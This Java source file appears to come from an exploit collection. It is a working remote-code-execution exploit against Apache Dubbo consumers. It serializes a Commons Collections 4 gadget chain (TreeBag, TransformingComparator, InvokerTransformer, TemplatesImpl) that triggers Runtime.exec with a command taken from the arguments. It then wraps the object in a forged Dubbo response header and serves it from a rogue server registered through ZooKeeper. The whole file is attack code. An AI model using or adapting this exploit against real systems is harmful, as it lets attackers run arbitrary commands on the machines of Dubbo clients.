package com.threedr3am.bug.dubbo.rouge.java;

import com.threedr3am.bug.dubbo.rouge.RougeBase;
import com.threedr3am.bug.dubbo.utils.Gadgets;
import com.threedr3am.bug.common.utils.Reflections;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Random;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.dubbo.common.io.Bytes;

/*
	Gadget chain:
        org.apache.commons.collections4.bag.TreeBag.readObject
        org.apache.commons.collections4.bag.AbstractMapBag.doReadObject
        java.util.TreeMap.put
        java.util.TreeMap.compare
        org.apache.commons.collections4.comparators.TransformingComparator.compare
        org.apache.commons.collections4.functors.InvokerTransformer.transform
        java.lang.reflect.Method.invoke
        sun.reflect.DelegatingMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke0
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer
            ... (TemplatesImpl gadget)
        java.lang.Runtime.exec
 */

/**
 * org.apache.commons:commons-collections4:4.0
 */
public class CommonsCollections8 extends RougeBase {

    public static void main(String[] args) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(args[0]);

        // setup harmless chain
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(templates);

        // arm transformer
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        ByteArrayOutputStream jserial2ByteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(jserial2ByteArrayOutputStream);
        objectOutputStream.writeByte(1);
        objectOutputStream.writeObject(tree);
        objectOutputStream.flush();
        objectOutputStream.close();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set response event and serialization flag.
        header[2] = (byte) ((byte) 0x20 | 3);
        header[3] = 20;

        // set response id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        Bytes.int2bytes(jserial2ByteArrayOutputStream.size(), header, 12);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(jserial2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        String zookeeperUri = "127.0.0.1:2181";
        String rougeHost = "127.0.0.1";
        int rougePort = 33336;

        new CommonsCollections8().startRougeServer(zookeeperUri, rougeHost, rougePort, bytes, true);
    }

    @Override
    public String getType() {
        return "java";
    }

}
